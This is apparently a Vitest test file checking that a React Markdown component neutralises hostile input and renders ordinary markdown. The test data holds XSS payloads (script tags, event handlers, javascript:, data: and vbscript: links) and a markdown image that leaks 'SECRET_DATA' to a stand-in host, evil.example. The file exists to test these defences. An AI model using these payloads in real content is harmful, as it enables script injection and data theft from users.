import { describe, it, expect } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { Markdown } from './Markdown';

const html = (md: string) => renderToStaticMarkup(<Markdown text={md} />);

describe('Markdown safety', () => {
  const hostile: [string, string][] = [
    ['script tag', '<script>alert(1)</script>hello'],
    ['inline handler', '<img src=x onerror="alert(1)">'],
    ['svg onload', '<svg onload=alert(1)></svg>'],
    ['iframe', '<iframe src="https://evil.example"></iframe>'],
    ['javascript link', '[click](javascript:alert(1))'],
    ['data link', '[x](data:text/html;base64,PHNjcmlwdD4=)'],
    ['vbscript link', '[x](vbscript:msgbox(1))'],
    ['html in table', '| a |\n|---|\n| <script>alert(1)</script> |'],
  ];
  for (const [name, md] of hostile) {
    it(`neutralises: ${name}`, () => {
      const out = html(md).toLowerCase();
      expect(out).not.toContain('<script');
      expect(out).not.toContain('<iframe');
      expect(out).not.toContain('<svg');
      expect(out).not.toContain('onerror=');
      expect(out).not.toContain('onload=');
      expect(out).not.toContain('javascript:');
      expect(out).not.toContain('data:text');
      expect(out).not.toContain('vbscript:');
      expect(out).not.toMatch(/<img[\s>]/);
    });
  }

  it('blocks markdown images (exfiltration) and shows a placeholder', () => {
    const out = html('![secret](https://evil.example/log?q=SECRET_DATA)');
    expect(out).not.toContain('<img');
    expect(out).not.toContain('evil.example');
    expect(out).toContain('image blocked');
  });

  it('renders external links safely with rel and a visible indicator', () => {
    const out = html('[docs](https://example.com/page)');
    expect(out).toContain('href="https://example.com/page"');
    expect(out).toContain('noopener noreferrer');
    expect(out).toContain('target="_blank"');
    expect(out).toContain('opens external site');
  });
});

describe('Markdown features', () => {
  it('renders headings, lists, tables, blockquotes, and code fences', () => {
    const out = html('# H1\n\n- a\n- b\n\n> quote\n\n| x | y |\n|---|---|\n| 1 | 2 |\n\n```js\nconst a = 1;\n```');
    expect(out).toContain('<h1');
    expect(out).toContain('<li>');
    expect(out).toContain('<blockquote');
    expect(out).toContain('<table');
    expect(out).toContain('table-wrap');
    expect(out).toContain('code-block');
    expect(out).toContain('const a = 1;');
  });
});
